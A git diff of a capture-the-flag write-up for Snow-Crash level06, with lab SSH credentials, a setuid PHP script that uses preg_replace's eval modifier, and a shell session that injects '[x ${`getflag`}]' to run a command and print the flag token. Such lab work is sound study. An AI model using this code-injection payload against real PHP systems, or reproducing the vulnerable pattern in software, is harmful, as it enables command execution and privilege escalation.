@@ -1,19 +1,18 @@
 # Flag 06
--
-``` shell
-ls -al
+
+- Access to Snow-Crash VM using level06/viuaaale9huek52boumoomioc credentials
+```
+e1r9p7% ssh -p 4242 level06@10.11.100.146
+```
+
+- `ll`
+```
 -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
 -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
 ```
 
-- `cat level06` -> 
-- `strings level06`
-
-- ` ./level06`
-`PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4`
-
 - `cat level06.php`
-```php
+``` php
 #!/usr/bin/php
 <?php
 function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
@@ -21,7 +20,6 @@ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\]
 $r = x($argv[1], $argv[2]); print $r;
 ?>
 ```
-
 
 ```php
 #!/usr/bin/php
@@ -45,45 +43,54 @@ $r = x($argv[1], $argv[2]); print $r;
 ?>
 ```
 
-- try to exec level06 script
-`./level06 level06.php`
-show content of the level06.php
+- Try to exec level06 script
+```
+level06@SnowCrash:~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/
+level06/level06.php on line 4
 
-- more tries
+level06@SnowCrash:~$ echo "aaaaa" > test
+-bash: test: Permission denied
 
-``` shell
-echo "aaa" > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
-aaa
+level06@SnowCrash:~$ echo "aaaaa" > /tmp/test
 
-level06@SnowCrash:~$ echo "`ls`" > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
+level06@SnowCrash:~$ ./level06 /tmp/test
+aaaaa
+```
+
+- So the code show the file content, try to pass cmd to be sure if the code juste show the contect or exec the content
+```
+level06@SnowCrash:~$ echo "ls" > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
+ls
+level06@SnowCrash:~$ echo "`ls`" > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
 level06
 level06.php
 ```
-- Goooood, so we can pass a cmd with baskticks and that the level06 script can exec it
-``` shell
-level06@SnowCrash:~$ echo "`getflag`" > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
+
+- Goooood, so I will try to pass `getflag` cmd within the file
+
+```
+level06@SnowCrash:~$ echo "`getflag`" > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
 Check flag.Here is your token : 
 Nope there is no token here for you sorry. Try again :)
-level06@SnowCrash:~$ echo "`getflag`" > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
-Check flag.Here is your token : 
-Nope there is no token here for you sorry. Try again :)
-level06@SnowCrash:~$ echo "${`getflag`}" > /tmp/aaa
+level06@SnowCrash:~$ echo "{`getflag`}" > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
+{Check flag.Here is your token : 
+Nope there is no token here for you sorry. Try again :)}
+level06@SnowCrash:~$ echo "${`getflag`}" > /tmp/test
 -bash: ${`getflag`}: bad substitution
-level06@SnowCrash:~$ echo '${`getflag`}' > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
-${`getflag`}
-level06@SnowCrash:~$ echo 'x ${`getflag`}' > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
-x ${`getflag`}
-level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/aaa
-level06@SnowCrash:~$ ./level06 /tmp/aaa
+level06@SnowCrash:~$ echo "$(`getflag`)" > /tmp/test
+Check: command not found
+level06@SnowCrash:~$ echo "[ var ${`getflag`}]" > /tmp/test
+-bash: [ var ${`getflag`}]: bad substitution
+level06@SnowCrash:~$ echo '[ var ${`getflag`}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
+( var ${`getflag`})
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
 ```
-
-- after some tests we are the flag now `wiok45aaoguiboiki2tuin6ub`
-
